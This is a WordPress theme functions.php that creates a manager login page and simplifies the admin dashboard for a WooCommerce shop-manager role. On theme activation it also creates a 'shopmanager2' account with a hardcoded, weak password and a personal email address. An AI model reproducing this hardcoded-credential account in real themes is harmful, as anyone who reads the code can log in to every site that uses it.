<?php 
	 //add new page

	if (isset($_GET['activated']) && is_admin()){
		$new_page_title = 'Manager Login';
		$new_page_content = '[loginform]';
		$new_page_template = ''; //ex. template-custom.php. Leave blank if you don't want a custom page template.
		//don't change the code bellow, unless you know what you're doing
		$page_check = get_page_by_title($new_page_title);
		$new_page = array(
			'post_type' => 'page',
			'post_title' => $new_page_title,
			'post_content' => $new_page_content,
			'post_status' => 'publish',
			'post_author' => 1,
		);
		if(!isset($page_check->ID)){
			$new_page_id = wp_insert_post($new_page);
			if(!empty($new_page_template)){
				update_post_meta($new_page_id, '_wp_page_template', $new_page_template);
			}
		}
		
		$homeSet = get_page_by_title( 'Home' );
		update_option( 'page_on_front', $homeSet->ID );
		update_option( 'show_on_front', 'page' );
		
		function add_new_user_account(){
			$username = 'shopmanager2';
			$password = 'shopmanager';
			$email = 'rev_gutierrez@yahoo.com';
			
			if(!username_exists($username) && !email_exists($email)){
				$user_id = wp_create_user($username, $password, $email);
				$user = new wp_user($user_id);
				$user->set_role('shop_manager');
			}
		}
		add_action('init','add_new_user_account');
	}
	
	
	function custom_login_form() {
	$args = array('redirect' => 'get_bloginfo("url")/manager-login/'); // This is where you redirect your users to where ever you like.
	wp_login_form($args);
	}
	 
	add_shortcode('loginform', 'custom_login_form'); // You place this shortcode [loginform] onto a page in your wp-admin area
	
if (current_user_can('shop_manager')) {

	function my_admin_head() {
	$url = get_option('siteurl');
    $dir = $url . '/wp-content/themes/mystile/';
    echo '<link rel="stylesheet" type="text/css" href="' .$dir. '/functions/css/adminstyle.css'. '">';
	}

	add_action('admin_head', 'my_admin_head');
	
	//add new menu: Add Product (sub to main) + logout button (on test)
	function new_prod_menu(){
		global $menu;
		$logouturl = wp_logout_url();
		$menu[99] = array('Add Product','read','post-new.php?post_type=product','','menu-top', 'menu-add-product', 'div');
		$menu[100] = array('Log Out','read', $logouturl ,'','menu-top', 'menu-log-out', 'div');
	}
	add_action('admin_menu', 'new_prod_menu');

	//Remove unecessary user roles
	$role = get_role('shop_manager');	
	$role->remove_cap('edit_others_pages');
	$role->remove_cap('edit_others_posts');
	$role->remove_cap('delete_others_pages');
	$role->remove_cap('delete_others_posts');
	$role->remove_cap('publish_posts');
	$role->remove_cap('publish_pages');
	$role->remove_cap('delete_posts');
	$role->remove_cap('delete_pages');

	//Remove Sub-Menu items
	function remove_submenus() {
	  global $submenu;
	  global $menu;
	  unset($submenu['users.php'][5]); //All Users
	  unset($submenu['users.php'][10]); //Add Users
	  unset($submenu['index.php'][10]); // Updates
	  
	  
	  $restricted = array(__('Links'), __('Comments'), __('Media'),
	  __('Plugins'), __('Tools'), __('Settings'), __('Pages'), __('Appearance'), __('Posts'));
	  end ($menu);
	  while (prev($menu)){
		$value = explode(' ',$menu[key($menu)][0]);
		if(in_array($value[0] != NULL?$value[0]:"" , $restricted)){
		  unset($menu[key($menu)]);}
		}
	}
	//Hook into admin menu
	add_action('admin_menu', 'remove_submenus');
	
	//Remove unecessary Dashboard Widgets
	function example_remove_dashboard_widgets() {
		remove_meta_box( 'dashboard_quick_press', 'dashboard', 'side' );
		remove_meta_box( 'dashboard_primary', 'dashboard', 'side' );
		remove_meta_box( 'dashboard_secondary', 'dashboard', 'side' );
		remove_meta_box( 'dashboard_recent_drafts', 'dashboard', 'side' );
		remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
		remove_meta_box( 'dashboard_recent_comments', 'dashboard', 'normal');
		remove_meta_box( 'dashboard_right_now', 'dashboard', 'normal');
	} 

	// Hook into the 'wp_dashboard_setup' action to register our function
	add_action('wp_dashboard_setup', 'example_remove_dashboard_widgets' );
	

	//function to redirect after logout
	function logout_redirect(){
	  wp_redirect( home_url('manager-login') ); 
	  exit; 
	}
	
	//hook function to wp_logout action
	add_action('wp_logout','logout_redirect');
	
	// Custom WordPress Footer

	function custom_footer () {
		echo '&copy; 2012 - Zurpay.com';
	}
	add_filter('admin_footer_text', 'custom_footer');
	
	//remove color picker for the admin scheme
	remove_action("admin_color_scheme_picker", "admin_color_scheme_picker");
	//renaming woocommerce title
	add_filter('gettext','change_post_to_article');
	add_filter('ngettext','change_post_to_article');
	
	function change_post_to_article($translated){
		$translated = str_ireplace('WooCommerce', 'Shop', $translated);
		return $translated;	
	}
	
	function remove_meta_boxes() {  
    remove_meta_box('postcustom','product','normal'); 
	remove_meta_box('slugdiv', 'product', 'normal');
	remove_meta_box('tagsdiv-product_tag', 'product', 'normal'); 
	}  
	add_action('admin_init','remove_meta_boxes');
	
	function hide_publishing_actions(){
        $my_post_type = 'product';
        global $post;
        if($post->post_type == $my_post_type){
            echo '
                <style type="text/css">
                    #delete-action,#misc-publishing-actions,#woothemes-settings, #postexcerpt, #ed_toolbar, #wp-content-editor-tools
                  	{
                        display:none;
                    }
					#publishing-action
					{
						float:left;	
					}
					#publishing-action img{
						float:right;
						margin-top: 5px;
						border: 1px solid red;
					}
					.quicktags-toolbar, .wp_themeSkin tr.mceFirst td.mceToolbar, h3 handle .widget .widget-top, .postbox h3, .stuffbox h3, .widefat thead tr th, .widefat tfoot tr th, h3.dashboard-widget-title, h3.dashboard-widget-title span, h3.dashboard-widget-title small, .find-box-head, .sidebar-name, #nav-menu-header, #nav-menu-footer, .menu-item-handle{
						background: -moz-linear-gradient(center top , #FAFAFA 0%, #E9E9E9 100%) !important;
						background: -webkit-gradient(linear, center top, from(#FAFAFA), to(#E9E9E9)) !important;
					}
					.widget, #widget-list .widget-top, .postbox, #titlediv, #poststuff .postarea, .stuffbox
					{
						border-color:#D5D5D5!important;
					}
					.widget .widget-top, .postbox h3, .stuffbox h3{
						color:#555555!important;
						text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.5)!important;
					}
					.meta-box-sortables .postbox:hover .handlediv{
						background:none !important;	
					}
					.postbox .hndle{
						 cursor:default !important;
					}
                </style>
            ';
        }
}
add_action('admin_head-post.php', 'hide_publishing_actions');
add_action('admin_head-post-new.php', 'hide_publishing_actions');

	/*add_filter('user_can_richedit','remove_user_can_richedit');
	
	function remove_user_can_richedit($c){
		global $post_type;
		
		if('product' == $post_type){
			return false;	
		}
		
		return $c;
	}*/
	
	//test
	
	function change_mce_options($init) {
	$init['theme_advanced_disable'] = 'numlist,blockquote,justifyright,pasteword,pastetext,woocommerce_shortcodes_button,woothemes_shortcodes_button';
	return $init;
	}
	add_filter('tiny_mce_before_init', 'change_mce_options');

	function custom_imageupload($content){
		remove_meta_box('postimagediv','product','side');
		add_meta_box('postimagediv',__('Add Images'), 'post_thumbnail_meta_box','product','normal','low');
	}
	add_action('do_meta_boxes','custom_imageupload');

	function custom_admin_post_thumbnail_html( $content ) {
		return $content = str_replace( __( 'Set featured image' ), __( 'Upload Images' ), $content );
	}
	add_filter( 'admin_post_thumbnail_html', 'custom_admin_post_thumbnail_html' );
	
	function add_featured_image_instruction( $content ) {
		return $content .= '<p>Having images of your product make it more enticing. Best size to upload: 450x450 pixels.</p>';
	}
	add_filter( 'admin_post_thumbnail_html', 'add_featured_image_instruction');
}
?>